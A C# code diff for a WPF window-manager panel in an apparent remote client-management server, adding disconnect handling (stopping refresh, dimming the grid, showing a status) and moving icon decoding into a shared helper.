@@ -42,6 +42,7 @@ public partial class WindowManagerWindow : ThemedWindow
     private          ICollectionView?  _view;
     private          DispatcherTimer?  _autoRefresh;
     private          string            _searchText = "";
+    private          bool              _disconnected;
 
     public WindowManagerWindow(TlsServer server, string clientId, string label)
     {
@@ -115,12 +116,22 @@ public partial class WindowManagerWindow : ThemedWindow
         TxtCount.Text = $"({_windows.Count(x => FilterWindow(x))})";
     }
 
-    private void Refresh() => _ = _server.SendToClient(_clientId, new Packet { Type = PacketType.WinGetList });
+    private void Refresh()
+    {
+        if (_disconnected) return;
+        _ = _server.SendToClient(_clientId, new Packet { Type = PacketType.WinGetList });
+    }
 
     private void OnClientDisconnected(SeroServer.Data.ConnectedClient c)
     {
         if (c.Id != _clientId) return;
-        Dispatcher.BeginInvoke(() => _autoRefresh?.Stop());
+        Dispatcher.BeginInvoke(() =>
+        {
+            _disconnected = true;
+            _autoRefresh?.Stop();
+            GridWins.Opacity = 0.55;
+            TxtStatus.Text   = Lang.Get("PM_DISCONNECTED");
+        });
     }
 
     private void OnList(Packet pkt)
@@ -239,17 +250,5 @@ public partial class WindowManagerWindow : ThemedWindow
     }
 
     private static System.Windows.Media.ImageSource? DecodeIcon(string b64)
-    {
-        if (string.IsNullOrEmpty(b64)) return _fallbackIcon;
-        try
-        {
-            var bytes = Convert.FromBase64String(b64);
-            using var ms = new System.IO.MemoryStream(bytes);
-            var bmp = new System.Windows.Media.Imaging.BitmapImage();
-            bmp.BeginInit(); bmp.CacheOption = System.Windows.Media.Imaging.BitmapCacheOption.OnLoad;
-            bmp.StreamSource = ms; bmp.EndInit(); bmp.Freeze();
-            return bmp;
-        }
-        catch { return _fallbackIcon; }
-    }
+        => UiHelpers.DecodeIcon(b64) ?? _fallbackIcon;
 }
